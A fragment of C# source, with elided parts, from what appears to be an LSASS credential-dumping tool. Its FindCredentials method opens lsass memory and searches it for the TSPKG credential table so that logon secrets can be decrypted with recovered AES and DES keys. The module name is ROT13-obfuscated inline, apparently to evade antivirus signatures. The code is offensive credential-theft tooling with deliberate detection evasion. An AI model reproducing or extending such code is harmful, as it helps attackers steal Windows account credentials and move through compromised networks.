...
namespace ldump_rot13.Module
{
    class Tspkg
    {
        ...
        public static int FindCredentials(IntPtr hLsass, IntPtr tspkgMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {
            ...
            tsGlobalCredTableAddr = Utility.GetListAdress(hLsass, tspkgMem, new string("gfcxt.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), max_search_size, oshelper.TSGlobalCredTableOffset, oshelper.TSGlobalCredTableSign);
